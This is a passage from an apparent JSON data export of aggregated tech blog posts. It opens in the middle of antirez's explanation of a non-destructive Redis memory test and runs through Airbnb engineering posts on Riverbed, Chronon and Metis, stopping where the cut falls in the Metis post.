continue;         *p++ = '\\0';         end = p;         p = strchr(p,' ');         if (!p) continue;         *p++ = '\\0';         if (strstr(p,\"stack\") ||             strstr(p,\"vdso\") ||             strstr(p,\"vsyscall\")) continue;         if (!strstr(p,\"00:00\")) continue;         if (!strstr(p,\"rw\")) continue;          start_addr = strtoul(start,NULL,16);         end_addr = strtoul(end,NULL,16);         size = end_addr-start_addr;          start_vect[regions] = start_addr;         size_vect[regions] = size;         printf(\"Testing %lx %lu\\n\", start_vect[regions], size_vect[regions]);         regions++;     }      ... code to actually test the found memory regions ...     /* NOTE: It is very important to close the file descriptor only now      * because closing it before may result into unmapping of some memory      * region that we are testing. */     fclose(fp); }  CPU cache ===  The other problem we have is the CPU cache. If we try to write something to a given memory address, and read it back to check if it is ok, we are actually only stressing the CPU cache and never hitting the memory that is supposed to be tested.  Actually writing a memory test that bypasses the CPU cache, without the need to resort to CPU specific tricks (like memory type range registers), is easy:  1) Fill all the addressable memory from the first to the last with the pattern you are testing. 2) Check all the addressable memory, from the first to the last,  to see if the pattern can be read back as expected.  Because we do it in two passes, as long as the size of the memory we are testing is larger than the CPU cache, we should be able to test the memory in a reliable way.  But there is a problem: this test destroys the content of the memory, that is not acceptable in our case, remember that we want to be able to provide a meaningful core dump if needed, after the crash?  On the other side, writing a memory test that does not destroy the memory content, but that is not able to bypass the cache, is also easy: for each location save the value of the location on the stack, test the location writing patterns and reading the patterns back, and finally set the correct value back to the tested location. However this test is completely useless as long as we are not able to disable the CPU cache.  How to write a memory test that:  A) Is able to bypass the cache. B) Does not destroy the memory content. C) Is able to, at least, to test every memory bit in the two possible states.  Well that's what I asked myself during the past weekend, and I found a simple solution that works as expected (as tested in a computer with broken memory, thanks Kosma! See credits at the end of the post).  This is the algorithm:  1) Take a CRC64 checksum of the whole memory. 2) Invert the content of every location from the first to the last (With \"invert\" I mean, bitwise complement, so that every 1 is turned into 0, and every 0 turned into 1). 3) Swap every adjacent location content. So I swap the content at addresses 0 and 1, 2 and 3, ... and so forth. 4) Swap again (step 3). 5) Invert again (step 2). 6) Take a CRC64 checksum of the whole memory. 7) Swap again. 8) Swap again. 9) Take a CRC64 checksum of the whole memory again.  If the CRC64 obtained at step 1, 6, and 9 are not the same, there is some memory error.  Now let's check why this is supposed to work: It is trivial to see how if memory is working as expected, after the steps I get back the original memory content, since I swap four times, and invert two times. However what happens if there are memory errors?  Let's do a test considering memory locations of just two bits for simplicity. So I've something like:  01|11|11|00       |       +----- this bit is broken and is always set to 1.  (step 1: CRC64) After step 2: 10|00|10|11 (note that the broken bit is still 1 instead of 0) After step 3: 00|10|11|10 (adjacent locations swapped) After step 4: 10|00|10|11 (swapped again) After step 5: 01|11|11|00 (inverted again, so far, no errors detected) (step 6: CRC64) After step 7: 11|01|10|11 After step 8: 01|11|11|10 (error!) (step 9: CRC64)  The CRC64 obtained at step 9 will differ. Now let's check the case of a bit always set to 0.  01|11|01|00       |       +----- this bit is broken and is always set to 0.  (step 1: CRC64) After step 2: 10|00|00|11 (invert) After step 3: 00|10|01|00 (swap) After step 4: 10|00|00|01 (swap) After step 5: 01|11|01|10 (invert) (step 6: CRC64) After step 7: 11|01|00|01 (swap) After step 8: 01|11|01|00 (swap) (step 9: CRC64)  This time is the CRC64 obtained at step 6 that will differ. You can check what happens if you flip bits in the adjacent location, but either at step 6 or 9 you should be always able to see a different checksum.  So basically this test does two things: first it amplifies the error using an adjacent location as helper, then use checksums to detect the error. The steps are performed always as \"read + write\" operations acting sequentially from the first to the last memory location to disable as much as possible the CPU cache.  You can find the code implementing this in the \"memcheck-on-crash\" branch on github, \"debug.c\" file:  https://github.com/antirez/redis/blob/memtest-on-crash/src/debug.c#L669  The kernel could do it better ===  After dealing with many crash reports that are actually due to memory errors, I'm starting to think that kernels are missing an incredible opportunity to make computers more reliable.  What Redis is doing could be done incrementally, a few pages per second, by the kernel with no impacts to actual performance. And the kernel is in a particularly good position:  1) It could detect the error easily bypassing the cache. 2) It could perform more interesting value retaining error tests writing patterns to pages that will be reused much later in time, and checking if the pattern matches before the page is reused. 3) The error could be logged in the system logs, making the user aware before a problem happens. 4) It could exclude the broken page from being used again, resulting in safer computing.  I hope to see something like that in the Linux kernel in the future.  The life of a lonely cosmic ray ===  A bit flipping at random is not a problem solely related to broken memory. Perfectly healthy memory is also subject, with a small probability, to bit flipping because of cosmic rays.  We are talking, of course, of non error correcting memory. The more costly ECC memory can correct a single bit error and can detect two bits errors halting the system. However many (most?) servers are currently using non ECC memory, and it is not clear if Amazon EC2 and other cloud providers are using or not ECC memory (it is not ok that this information is not clearly available in my opinion, given the cost of services like EC2 and the possible implications of not using ECC memory).  According to a few sources, including IBM, Intel and Corsair, a computer with a few GB of memory of non-ECC memory is likely to incur to *several* memory errors every year. Of course you can't detect errors with a memory test if the bit flipping was caused by a cosmic ray hitting your memory, so to cut a long story short:  Users reporting isolated, impossible to understand and reproduce crashes, not using ECC memory, can't be taken as a proof that there is a bug even if the fast on-crash memory test passes, if the more accurate redis --test-memory passes, and even if they run memtest86 for several days after the event.  Anyway not every bit flipped is going to trigger a crash after all, because as somebody on stack overflow said:      \"Most of the memory contains data, where the flip won't be that visiblp\"  The bytes representing 'p' and 'e' are not just 1 bit away, but I find the sentence to be fun anyway.  Credits ===  A big Thank You to Kosma Moczek that reported how my initial approach was not working due to the CPU cache, and donated ssh access to a fast computer with a single bit memory error. Comments", "content": "", "cover_photo_url": "http://antirez.com/images/favicon.png", "profile": 4, "updated_on": "2012-12-03T15:37:19Z", "upvotes_count": 1, "aggregate_votes_count": 1, "comments_count": 0, "score": 4900.7684967, "slug": "redis-crashes-96", "topics": []}}, {"model": "app.post", "pk": 97, "fields": {"title": "Redis children can now report amount of copy-on-write", "link": "http://antirez.com/news/42", "source": 1, "normalized_link": "antirez.com/news/42", "summary": "This is one of this trivial changes in Redis that can make a big difference for users. Basically in the unstable branch I added some code that has the following effect, when running Redis on Linux systems:  [32741] 19 Nov 12:00:55.019 * Background saving started by pid 391 [391] 19 Nov 12:01:00.663 * DB saved on disk [391] 19 Nov 12:01:00.673 * RDB: 462 MB of memory used by copy-on-write  As you can see now the amount of additional memory used by the saving child is reported (it is also reported for AOF rewrite operations).  I think this is big news for users as instead to see us developers and other Redis experts handwaving about the amount of copy-on-write being proportional to number of write ops per second and time used to produce the RDB or AOF file, now they get a number :-)  # How it is obtained?  We use the /proc//smaps, so yes, this is Linux only. Basically it is the sum of all the Private_Dirty entries in this file for the child process (actually you could measure it on the parent side and it is the same).  I verified that the number we obtain actually corresponds very well with the physical amount of memory consumed during a save, in different conditions, so I'm very confident we provide an accurate information.  # Why a number in the log file instead of an entry in the INFO output?  Because even before calling wait3() from the parent, as long as the child exits we no longer have this information. So to display this information in INFO we need some inter process communication to move this info from the child to the parent. Not rocket science but for now I avoided adding extra complexity. The current patch is trivial enough that we could backport it into 2.6 for the joy of many users:  https://github.com/antirez/redis/commit/3bfeb9c1a7044cd96c1bd77677dfe8b575c73c5f https://github.com/antirez/redis/commit/49b645235100fc214468b608c1ba6cdbc320fa88  The log is produced at NOTICE level (so it is displayed by default). Comments", "content": "", "cover_photo_url": "http://antirez.com/images/favicon.png", "profile": 4, "updated_on": "2012-11-18T15:36:37Z", "upvotes_count": 1, "aggregate_votes_count": 1, "comments_count": 0, "score": 4871.9675633, "slug": "redis-children-can-now-report-amount-of-copy-on-write-97", "topics": []}}, {"model": "app.post", "pk": 98, "fields": {"title": "Memory errors and DNS", "link": "http://antirez.com/news/41", "source": 1, "normalized_link": "antirez.com/news/41", "summary": "Memory errors in computers are so common that you can register domain names similar to very famous domain names, but altered in one bit, and get a number of requests per hour:  http://dinaburg.org/bitsquatting.html Comments", "content": "", "cover_photo_url": "http://antirez.com/images/favicon.png", "profile": 4, "updated_on": "2012-11-17T15:36:14Z", "upvotes_count": 1, "aggregate_votes_count": 1, "comments_count": 0, "score": 4870.0470522, "slug": "memory-errors-and-dns-98", "topics": []}}, {"model": "app.post", "pk": 99, "fields": {"title": "On Twitter, at Twitter", "link": "http://antirez.com/news/40", "source": 1, "normalized_link": "antirez.com/news/40", "summary": "On Twitter:  @War3zRub1 \"Hahaha it's silly how people use Redis when they need a reverse proxy\" @C4ntc0de \"ZOMG! Use a real message queue, Redis is not a queue!\" @L4m3tr00l \"My face when Redis BLABLABLA...\"  Meanwhile *at* Twitter:  OP1: \"Hey guys, there is a spike in the number of lame messages today, load is increasing...\" OP2: \"Yep noticed, it's the usual troll fiesta trowing shit at Redis, 59482 messages per second right now.\" OP1: \"Ok, no prob, let's spawn two additional Redis nodes to serve their timelines as smooth as usually\".  TL;DR: http://www.infoq.com/presentations/Real-Time-Delivery-Twitter Comments", "content": "", "cover_photo_url": "http://antirez.com/images/favicon.png", "profile": 4, "updated_on": "2012-11-12T15:35:54Z", "upvotes_count": 1, "aggregate_votes_count": 1, "comments_count": 0, "score": 4860.4466078, "slug": "on-twitter-at-twitter-99", "topics": []}}, {"model": "app.post", "pk": 100, "fields": {"title": "Eventual consistency: when, and how?", "link": "http://antirez.com/news/39", "source": 1, "normalized_link": "antirez.com/news/39", "summary": "This post by Peter Bailis is a must read. \"Safety and Liveness: Eventual consistency is not safe\" [1].  [1] http://www.bailis.org/blog/safety-and-liveness-eventual-consistency-is-not-safe/  An extreme TL;DR of this is.  1) In an eventually consistent system, when all the nodes will agree again after a partition? 2) In an eventually consistent system, HOW the nodes will agree about inconsistencies? 3) In immediately consistent systems, when I'm no longer able to write? When I'm no longer able to read?  Basically:  \"1\" is time (or more practically, conditions needed to merge). \"2\" is safety (or more practically, merge strategy). \"3\" is availability (or more practically, how much of the system can be down, for me to be still able to write and read). Comments", "content": "", "cover_photo_url": "http://antirez.com/images/favicon.png", "profile": 4, "updated_on": "2012-11-09T15:35:20Z", "upvotes_count": 1, "aggregate_votes_count": 1, "comments_count": 0, "score": 4854.6858522, "slug": "eventual-consistency-when-and-how-100", "topics": []}}, {"model": "app.post", "pk": 101, "fields": {"title": "Optimizing the TCP/IP checksum calculation. Interesting low level journey.", "link": "http://locklessinc.com/articles/tcp_checksum/", "source": 1, "normalized_link": "locklessinc.com/articles/tcp_checksum", "summary": "Comments", "content": "", "cover_photo_url": "http://locklessinc.com/images/menu/menu1_divider_right.gif", "profile": 4, "updated_on": "2012-11-08T15:34:56Z", "upvotes_count": 1, "aggregate_votes_count": 1, "comments_count": 0, "score": 4852.7653189, "slug": "optimizing-the-tcpip-checksum-calculation-interesting-low-level-journey-101", "topics": []}}, {"model": "app.post", "pk": 102, "fields": {"title": "Riverbed: Optimizing Data Access at Airbnb\u2019s Scale", "link": "https://medium.com/airbnb-engineering/riverbed-optimizing-data-access-at-airbnbs-scale-c37ecf6456d9?source=rss----53c7c27702d5---4", "source": 1, "normalized_link": "medium.com/airbnb-engineering/riverbed-optimizing-data-access-at-airbnbs-scale-c37ecf6456d9", "summary": "An overview of Airbnb\u2019s Data Framework for faster and more reliable read-heavy workloads.By: Sivakumar Bhavanari, Krish Chainani, Victor Chen, Yanxi Chen, Xiangmin Liang, Anton Panasenko, Sonia Stan, Peggy Zheng and Amre\u00a0ShakimOverviewThe evolution of Airbnb and its tech stack calls for a scalable and reliable foundation that simplifies the access and processing of complex data sets. Enter Riverbed, a data framework designed for fast read performance and high availability. In this blog series, we will introduce Riverbed, highlighting its objectives, design, and features.Why was Riverbed\u00a0CreatedThe growth of Airbnb has accelerated the number of databases we operate, the variety of data types they serve, and the addition of data-intensive services accessing these databases, resulting in complex data infrastructure and a Service-Oriented Architecture (SOA) that is difficult to\u00a0manage.Figure 1. Airbnb SOA dependency graphWe have noticed a specific pattern of queries that involve accessing multiple data sources, have complicated hydration business logic, and involve complex data transformations that are difficult to optimize. Airbnb workloads heavily utilize these queries on the read path, which exacerbates performance issues.Let\u2019s examine how Airbnb\u2019s payment system faced challenges after transitioning from a monolith to SOA. The payment system at Airbnb is complex and involves accessing multiple data sources while requiring complex business logic to compute fees, transaction dates, currencies, amounts, and total earnings. However, after their SOA migration, the data needed for these calculations became scattered across various services and tables. This made it challenging to provide all the necessary information in a simple and performant manner, particularly for read-heavy requests. To learn more about these and other challenges, we recommend reading this blog\u00a0post.One possible solution is to register most frequented queries, pre-compute the denormalized payment data, and provide a table to store the computed results, making them optimized for read-heavy requests. This is known as a materialized view, and is provided as a built-in functionality by many databases.In an SOA environment where data is distributed across multiple databases, the views we create depend on data from various sources. This technique is widely adopted in industry and usually implemented using a combination of Change-Data-Capture (CDC), stream processing, and a database to persist the final\u00a0results.Lambda and Kappa are two real-time data processing architectures. Lambda combines batch and real-time processing for efficient handling of large data volumes, while Kappa focuses solely on streaming processing. Kappa\u2019s simplicity offers better maintainability, but it poses challenges for implementing backfill mechanisms and ensuring data consistency, especially with out-of-order events.To address these challenges and simplify the construction and management of distributed materialized views, we developed Riverbed. Riverbed is a Lambda-like data framework that abstracts the complexities of maintaining materialized views, enabling faster product iterations. In the following sections, we will discuss Riverbed\u2019s design choices and the tradeoffs made to achieve high performance, reliability, and consistency goals.Riverbed DesignOverviewAt a high level, Riverbed adopts Lambda architecture that consists of an online component for processing real-time event changes and an offline component for filling missing data. Riverbed provides a declarative interface for product engineers to define the queries and implement the business logic for computation using GraphQL for both the online and offline components. Under the hood, the framework efficiently executes the queries, computes the derived data and eventually writes to one or multiple designated sink(s). Riverbed handles the heavy lifting of some common challenges of data intensive systems, such as concurrent writes, versioning, integrations with various infrastructure components at Airbnb, data correctness guarantees, and ultimately enables the product teams to quickly iterate on product features.Streaming systemFigure 2. Streaming systemThe streaming system\u2019s primary function is to address the incremental view materialization problem that arises when changes are made to system-of-record tables. To achieve this, the system consumes Change-Data-Capture (CDC) events via a Kafka-based system. It converts these events into \u201cnotification\u201d triggers, which are associated with specific document IDs in the sink. A \u201cnotification\u201d trigger serves as a signal to refresh a particular document. This process occurs in a highly-parallel manner with out-of-order, batched consumers. Within each batch, notification triggers are deduplicated before being written to\u00a0Kafka.A second process consumes the earlier produced \u201cnotification\u201d triggers. Using a series of joins, data stitching, and executing user-specified operations, the \u201cnotifications\u201d are transformed into a document. The resulting document is then drained into the designated sink. Whenever a change occurs on a system-of-record table, the system replaces the affected document with a more up-to-date version, ensuring eventual consistency.Batch systemThere is still a possibility of occasional event loss throughout the pipeline or due to bugs, such as in CDC. Recognizing the need to address these potential inconsistencies, we implemented a batch system that reconciles missing events occurring from online streaming changes. This process helps to identify only the changed data in terms of the materialized view document and provides a mechanism for bootstrapping the materialized view through a backfill. However, reading and processing large volumes of data from online sources may pose performance bottlenecks and potential heterogeneity issues, making direct backfills or reconciliation from these sources infeasible.To overcome these challenges, Riverbed leverages Apache Spark within its backfilling or reconciliation pipelines, taking advantage of the daily snapshots stored in the offline data warehouse. The framework generates Spark SQL based on GraphQL queries created by clients. Using the data from the warehouse, Riverbed re-uses the same business logic from the streaming system to transform the data and write to\u00a0sinks.Figure 3. Batch\u00a0systemConcurrency/versioningIn any distributed system, concurrent updates can cause race conditions that result in incorrect or inconsistent data. Riverbed avoids race conditions by serializing all changes for a given document using Kafka. Incoming source mutations are first converted to intermediate events only containing the sink document ID and are written to Kafka, then a secondary (notification) process consumes these intermediate events, materializes and writes them to the sink. Because the intermediate Kafka topic is partitioned by the document ID of the event, all documents with the same document ID will be processed serially by the same consumer, avoiding the problem of race conditions from parallel real-time streaming writes altogether.To solve for parallel writes between real-time streaming and offline jobs, we store a version based on timestamps in the sink. Each sink type is required to only allow writes if the version is greater than or equal to the current version, which solves for race conditions between streaming and batch\u00a0systems.Conceptually, Riverbed views each mutation as a hint of a change. The processor always uses data from the source of truth, and hence will produce sink documents in the latest consistent state as of the time of processing. Now processing of events is idempotent and can be done any number of times and in any\u00a0order.ResultsRiverbed has had a broad impact across Airbnb. It currently processes 2.4B events and writes 350M documents on a daily basis, and powers 50+ materialized views across Airbnb. Riverbed helps power features such as payments, search within messages, review rendering on the listing page, and many other features around co-hosting, itineraries, and internal facing products.Summary and Next\u00a0StepsIn conclusion, Riverbed provides a scalable and high-performance data framework that improves the efficiency of read-heavy workloads. Riverbed\u2019s design choices provide a declarative interface for product engineers, efficient execution of queries, and data correctness guarantees. This simplifies the construction and management of distributed materialized views and enables product teams to quickly iterate on features. Using Riverbed for pre-computing views of data has already resulted in significant latency improvements and improved reliability of the flow, ensuring a faster and more reliable experience for Airbnb\u2019s Host and Guest communities.In future posts, we will explore different aspects of Riverbed in greater detail, including its design considerations, performance optimizations, and future development directions.AcknowledgmentsAll of this has been a significant collective effort from the team and any discussion of Read-Optimized Stores would not be complete without acknowledging the invaluable contributions of everyone on the team, both past and present. Big thanks to Will Moss, Krish Chainani, Victor Chen, Sonia Stan, Xiangmin Liang, Siva Bhavanari, Peggy Zheng, Yanxi Chen on the development team; support from Juan Tamayo, Zoran Dimitrijevic, Zheng Liu, Chandramouli Rangarajan and leadership from Amre Shakim, Jessica Tai, Parth Shah, Adam Kocoloski, Abhishek Parmar, Bill Farner and Usman Abbasi. Last but not least, we would like to extend our sincere gratitude to Shylaja Ramachandra, Lauren Mackevich and Tina Nguyen for their invaluable assistance in editing and publishing this post. Their contributions have greatly improved the quality and clarity of the\u00a0content.****************All product names, logos, and brands are property of their respective owners. All company, product and service names used in this website are for identification purposes only. Use of these names, logos, and brands does not imply endorsement.Riverbed: Optimizing Data Access at Airbnb\u2019s Scale was originally published in The Airbnb Tech Blog on Medium, where people are continuing the conversation by highlighting and responding to this story.", "content": "", "cover_photo_url": "https://miro.medium.com/v2/resize:fit:1200/1*XAjUlEyK1CEVa2L5WOpcmw.jpeg", "profile": 3, "updated_on": "2023-07-25T18:46:01Z", "upvotes_count": 1, "aggregate_votes_count": 1, "comments_count": 0, "score": 12362.1400967, "slug": "riverbed-optimizing-data-access-at-airbnbs-scale-102", "topics": [8, 26, 25, 28, 27]}}, {"model": "app.post", "pk": 103, "fields": {"title": "Chronon\u200a\u2014\u200aA Declarative Feature Engineering Framework", "link": "https://medium.com/airbnb-engineering/chronon-a-declarative-feature-engineering-framework-b7b8ce796e04?source=rss----53c7c27702d5---4", "source": 1, "normalized_link": "medium.com/airbnb-engineering/chronon-a-declarative-feature-engineering-framework-b7b8ce796e04", "summary": "Chronon\u200a\u2014\u200aA Declarative Feature Engineering FrameworkA framework for developing production grade features for machine learning models. The purpose of the blog is to provide an overview of core concepts in\u00a0Chronon.Nikhil Simha\u00a0RaproluBackgroundAirbnb uses machine learning in almost every product, from ranking search results to intelligently pricing listings and routing users to the right customer support\u00a0agents.We noticed that feature management was a consistent pain point for the ML Engineers working on these projects. Rather than focusing on their models, they were spending a lot of their time gluing together other pieces of infrastructure to manage their feature data, and still encountering issues.One common issue arose from the log-and-wait approach to generating training data, where a user logs feature values from their serving endpoint, then waits to accumulate enough data to train a model. This wait period can be more than a year for models that need to capture seasonality. This was a major pain point for machine learning practitioners, hindering them from responding quickly to changing user behaviors and product\u00a0demands.A common approach to address this wait time is to transform raw data in the warehouse into training data using ETL jobs. However, users encountered a critical problem when they tried to launch their model to production\u200a\u2014\u200athey needed to write complex streaming jobs or replicate ETL logic to serve their feature data, and often could not guarantee that the feature distribution for serving model inference was consistent with what they trained on. This training-serving skew led to hard-to-debug model degradation, and worse than expected model performance.Chronon was built to address these pain points. It allows ML practitioners to define features and centralize the data computation for both model training and production inference, while guaranteeing consistency between the\u00a0two.Introducing ChrononThis post is focused on the Chronon API and capabilities. At a high level, these\u00a0include:Ingesting data from a variety of sources\u200a\u2014\u200aEvent streams, fact/dim tables in warehouse, table snapshots, Slowly Changing Dimension tables, Change Data Streams,\u00a0etc.Transforming that data\u200a\u2014\u200aIt supports standard SQL-like transformations as well as more powerful time-based aggregations.Producing results both online and offline\u200a\u2014\u200aOnline, as low-latency end-points for feature serving, or Offline as Hive tables, for generating training\u00a0data.Flexible choice for updating results\u200a\u2014\u200aYou can choose whether the feature values are updated in real-time or at fixed intervals with an \u201cAccuracy\u201d parameter. This also ensures the same behavior even while backfilling.Using a powerful Python API\u200a\u2014\u200athat treats time based aggregation and windowing as first-class concepts, along with familiar SQL primitives like Group-By, Join, Select etc, while retaining the full flexibility and composability offered by\u00a0Python.API OverviewFirst, let\u2019s start with an example. The code snippet computes the number of times an item is viewed by a user in the last five hours from an activity stream, while applying some additional transformations and filters. This uses concepts like GroupBy, Aggregation, EventSource etc.,.In the sections below we will demystify these concepts.Understanding accuracySome use-cases require derived data to be as up-to-date as possible, while others allow for updating at a daily cadence. For example, understanding the intent of a user\u2019s search session requires accounting for the latest user activity. To display revenue figures on a dashboard for human consumption, it is usually adequate to refresh the results in fixed intervals.Chronon allows users to express whether a derivation needs to be updated in near real-time or in daily intervals by setting the \u2018Accuracy\u2019 of a computation\u200a\u2014\u200awhich can be either \u2018Temporal\u2019 or \u2018Snapshot\u2019. In Chronon this accuracy applies both to online serving of data via low latency endpoints, and also offline backfilling via batch computation jobs.Understanding data\u00a0sourcesReal world data is ingested into the data warehouse continuously. There are three kinds of ingestion patterns. In Chronon these ingestion patterns are specified by declaring the \u201ctype\u201d of a data\u00a0source.Event data\u00a0sourcesTimestamped activity like views, clicks, sensor readings, stock prices etc\u200a\u2014\u200apublished into a data stream like\u00a0Kafka.In the data lake these events are stored in date-partitioned tables (Hive). Assuming timestamps are millisecond precise and the data ingestion is partition by date\u200a\u2014\u200aa date partition \u20182023\u201307\u201304\u2019, of click events contains click events that happened between \u20182023\u201307\u201304 00:00:00.000\u2019 and \u20182023\u201307\u201304 23:59:59.999\u2019. Users can configure the date partition based on your warehouse convention, once globally, as a Spark parameter.\u2014 conf \u201cspark.chronon.partition.column=date_key\u201dIn Chronon you can declare an EventSource by specifying two things, a \u2018table\u2019 (Hive) and optionally a \u2018topic\u2019 (Kafka). Chronon can use the \u2018table\u2019 to backfill data\u200a\u2014\u200awith Temporal accuracy. When a \u2018topic\u2019 is provided, we can update a key-value store in real-time to serve fresh data to applications and ML\u00a0models.Entity data\u00a0sourcesAttribute metadata related to business entities. Few examples for a retail business would be, user information\u200a\u2014\u200awith attributes like address, country etc., or item information\u200a\u2014\u200awith attributes like price, available count etc. This data is usually served online via OLTP databases like MySQL to applications. These tables are snapshotted into the warehouse usually at daily intervals. So a \u20182023\u201307\u201304\u2019 partition contains a snapshot of the item information table taken at \u20182023\u201307\u201304 23:59:59.999\u2019.However these snapshots can only support \u2018Snapshot\u2019 accurate computations but insufficient for \u2018Temporal\u2019 accuracy. If you have a change data capture mechanism, Chronon can utilize the change data stream with table mutations to maintain a near real-time refreshed view of computations. If you also capture this change data stream in your warehouse, Chronon can backfill computations at historical points in time with \u2018Temporal\u2019 accuracy.You can create an entity source by specifying three things: \u2018snapshotTable\u2019 and optionally \u2018mutationTable\u2019 and \u2018mutationTopic\u2019 for \u2018Temporal\u2019 accuracy. When you specify \u2018mutationTopic\u2019\u200a\u2014\u200athe data stream with mutations corresponding to the entity, Chronon will be able to maintain a real-time updated view that can be read from in low latency. When you specify \u2018mutationTable\u2019, Chronon will be able to backfill data at historical points in time with millisecond precision.Cumulative Event\u00a0SourcesThis data model is typically used to capture history of values for slowly changing dimensions. Entries of the underlying database table are only ever inserted and never updated except for a surrogate (SCD2).They are also snapshotted into the data warehouse using the same mechanism as entity sources. But because they track all changes in the snapshot, just the latest partition is sufficient for backfilling computations. And no \u2018mutationTable\u2019 is required.In Chronon you can specify a Cumulative Event Source by creating an event source with \u2018table\u2019 and \u2018topic\u2019 as before, but also by enabling a flag \u2018isCumulative\u2019. The \u2018table\u2019 is the snapshot of the online database table that serves application traffic. The \u2018topic\u2019 is the data stream containing all the insert\u00a0events.Understanding computation contextsChronon can compute in two contexts, online and offline with the same compute definition.Offline computation is done over warehouse datasets (Hive tables) using batch jobs. These jobs output new datasets. Chronon is designed to deal with datasets that change\u200a\u2014\u200anewly arriving data into the warehouse as Hive table partitions.Online, the usage is to serve application traffic in low latency(~10ms) at high QPS. Chronon maintains endpoints that serve features that are updated in real-time, by generating \u201clambda architecture\u201d pipelines. You can set a parameter \u201conline = True\u201d in Python to enable\u00a0this.Under the hood, Chronon orchestrates pipelines using Kafka, Spark/Spark Streaming, Hive, Airflow and a customizable key-value store power serving and training data generation.Understanding computation typesAll chronon definitions fall into three categories\u200a\u2014\u200aa GroupBy, Join or a StagingQuery.GroupBy\u200a\u2014\u200ais an aggregation primitive similar to SQL, with native support for windowed and bucketed aggregations. This supports computation in both online and offline contexts and in both accuracy models\u200a\u2014\u200aTemporal (realtime refreshed) and Snapshot (daily refreshed). GroupBy has a notion of keys by which the aggregations are performed.Join\u200a\u2014\u200aJoins together data from various GroupBy computations. In online mode, a join query containing keys, will be fanned out into queries per groupBy and external services and the results will be joined together and responded as a map. In offline mode, joins which can be thought of as a list of queries at historical points in time, against which the results need to be computed in a point-in-time correct fashion. If the left side is Entities, we always compute responses as of midnight.StagingQuery\u200a\u2014\u200aallows for arbitrary computation expressed as Spark SQL query, that is computed offline daily. Chronon produces partitioned datasets. It is best suited for data pre or post processing.Understanding AggregationsGroupBys in Chronon essentially aggregate data by given keys. There are several extensions to the traditional SQL group-by that make Chronon aggregations powerful.Windows\u200a\u2014\u200aOptionally, you can choose to aggregate only recent data within a window of time. This is critical for ML since un-windowed aggregations tend to grow and shift in their distributions, degrading model performance. It is also critical to place greater emphasis on recent events over very old\u00a0events.Bucketing\u200a\u2014\u200aOptionally you can also specify a second level of aggregation, on a bucket\u200a\u2014\u200abesides the Group-By keys. The output of a bucketed aggregation is a column of map type containing the bucket column as keys and aggregates as\u00a0value.Auto-unpack\u200a\u2014\u200aIf the input column contains data nested within an array, Chronon will automatically unpack.Time based aggregations\u200a\u2014\u200alike first_k, last_k, first, last etc when a timestamp is specified in the data\u00a0source.You can combine all of these options flexibly to define very powerful aggregations. Chronon internally maintains partial aggregates and combines them to produce features at different points-in-time. So using very large windows and backfilling training data for large date ranges is not a\u00a0problem.Putting Everything togetherAs a user, you need to declare your computation only once, and Chronon will generate all the infrastructure needed to continuously turn raw data into features for both training and serving. ML practitioners at Airbnb no longer spend months trying to manually implement complex pipelines and feature indexes. They typically spend less than a week to generate new sets of features for their\u00a0models.Our core goal has been to make feature engineering as productive and as scalable as possible. Since the release of Chronon users have developed over ten thousand features powering ML models at\u00a0Airbnb.Sponsors: Dave Nagle Adam Kocoloski Paul Ellwood Joy Zhang Sanjeev Katariya Mukund Narasimhan Jack Song Weiping Peng Haichun Chen Atul\u00a0KaleContributors: Varant Zanoyan Pengyu Hou Cristian Figueroa Haozhen Ding Sophie Wang Vamsee Yarlagadda Evgenii Shapiro Patrick\u00a0YoonPartners: Navjot Sidhu Xin Liu Soren Telfer Cheng Huang Tom Benner Wael Mahmoud Zach Fein Ben Mendler Michael Sestito Yinhe Cheng Tianxiang Chen Jie Tang Austin Chan Moose Abdool Kedar Bellare Mia Zhao Yang Qi Kosta Ristovski Lior Malka David Staub Chandramouli Rangarajan Guang Yang Jian\u00a0ChenChronon\u200a\u2014\u200aA Declarative Feature Engineering Framework was originally published in The Airbnb Tech Blog on Medium, where people are continuing the conversation by highlighting and responding to this story.", "content": "", "cover_photo_url": "https://miro.medium.com/v2/resize:fit:1200/0*zVx5nqX7ADS6dRuO", "profile": 3, "updated_on": "2023-07-11T18:48:31Z", "upvotes_count": 1, "aggregate_votes_count": 1, "comments_count": 0, "score": 12335.26343, "slug": "chronon-a-declarative-feature-engineering-framework-103", "topics": [30, 31, 26, 29, 9]}}, {"model": "app.post", "pk": 104, "fields": {"title": "Metis: Building Airbnb\u2019s Next Generation Data Management Platform", "link": "https://medium.com/airbnb-engineering/metis-building-airbnbs-next-generation-data-management-platform-d2c5219edf19?source=rss----53c7c27702d5---4", "source": 1, "normalized_link": "medium.com/airbnb-engineering/metis-building-airbnbs-next-generation-data-management-platform-d2c5219edf19", "summary": "How Airbnb evolved our data catalog into a platform for managing and governing our data warehouse at\u00a0scale.By: Erik Ritter, Jiaxin Ye, Sylvia Tomiyama, Woody Zhou, Xiaobin Zheng, Zuzana VejrazkovaIntroductionAt Airbnb, millions of data assets exist in a complex ecosystem to inform our business and improve our products. The Data Management team\u2019s mission is to empower the company to manage its data ecosystem at\u00a0scale.To do this, we need an accurate understanding of all of the assets in our ecosystem and how they relate to each other. In other words, it requires accurate metadata. Our data management platform Metis, named for the Greek goddess of good counsel, is our solution to ensure that trustworthy metadata can be captured, managed, and consumed at\u00a0scale.From humble beginningsMetis is an evolution of our existing foundation of metadata products within\u00a0Airbnb.Dataportal was our first effort towards democratizing data: successfully enabling data users to find trusted data. It was a huge boon to productivity and pretty ahead of its\u00a0time.As data reliability and compliance regulations became important, we needed a more comprehensive and detailed understanding of how data was transformed. This led to our adoption of Apache Atlas as our data lineage solution. Apache Atlas powers products like SLA Tracker (see Visualizing Data timeliness at Airbnb), which combines landing time metadata and lineage to enable debugging upstream data\u00a0delays.As our requirements for metadata increased, expanding to more areas like cost management, data quality, etc, our needs for a data catalog have expanded:Ability to govern both the data and metadata describing itGuardrails and recommendations to improve data\u00a0qualityAuditability of a dataset\u2019s history, both for debugging & governance purposesWe soon learned that data management had to be pursued as a discipline, thus building Metis as the one-stop-shop for accessing all data metadata.What we\u2019ve\u00a0builtMetis is made up of three core products: Dataportal, Unified Metadata Service (UMS), and Lineage Service. Together, this platform allows Airbnb to manage millions of data assets across many domains. A short list of assets we support\u00a0include:Apache Hive and Trino\u00a0datasetsMetrics and Dimensions, powered by Airbnb\u2019s Metric Platform: MinervaCharts and Dashboards from Apache Superset and\u00a0Tableau\u00aeData Models, including those certified by\u00a0MidasMachine Learning features and\u00a0modelsTeams and employees of Airbnb (not technically a data asset, but key to support high quality ownership and ensure metadata remains up to date for all the above data\u00a0assets)Metis ArchitectureMetis ArchitectureOn a high level, Metis consists of following 